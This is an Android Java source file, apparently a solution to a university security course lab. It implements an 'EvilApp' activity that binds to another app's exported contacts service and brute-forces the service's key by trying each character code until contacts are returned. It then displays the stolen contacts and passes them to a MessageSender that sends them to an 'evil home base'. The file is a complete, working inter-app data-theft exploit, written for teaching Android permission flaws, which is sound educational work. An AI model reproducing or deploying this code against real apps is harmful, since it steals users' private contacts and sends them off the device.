package com.cs155.evilapp;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.cs155.trustedapp.IGetContactsString;

/**
 * Created by melvinj on 6/1/15.
 */
public class MainActivityNoKey extends Activity {

    IGetContactsString mIGetContactsString;
    String contacts = "";
    private ServiceConnection sc = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mIGetContactsString = IGetContactsString.Stub.asInterface(service);
            try {
                int i = 0;
                while (contacts.equals("")) {
                    String str = Character.toString((char) i++);
                    contacts = mIGetContactsString.GetContacts(str);
                }
                showContacts(contacts);
            } catch (RemoteException e) {
                Log.v(getClass().getSimpleName(), e.getMessage());
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mIGetContactsString = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.btn_steal_contacts);

        View.OnClickListener listen = new View.OnClickListener() {
            public void onClick(View v) {
                // The following line shows how to use the Log library.
                Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");

                // TODO: Steal the contacts from TrustedApp
                stealContacts();
            }
        };

        button.setOnClickListener(listen);
    }

    /* Use this method to display the contacts in the EvilApp GUI */
    private void showContacts(String contacts) {
        TextView contactView = (TextView) findViewById(R.id.text_view_contacts);
        contactView.setText("Contacts:\n" + contacts);

        // Send the contacts to your evil home base
        // Please do not remove this call
        MessageSender m = new MessageSender();
        m.SendMessage(contacts);
    }


    private void stealContacts() {
        // TODO: your implementation here
        Intent intent = new Intent("com.cs155.trustedapp.ReadContactsService");
        this.bindService(intent, sc, Context.BIND_AUTO_CREATE);
    }
}
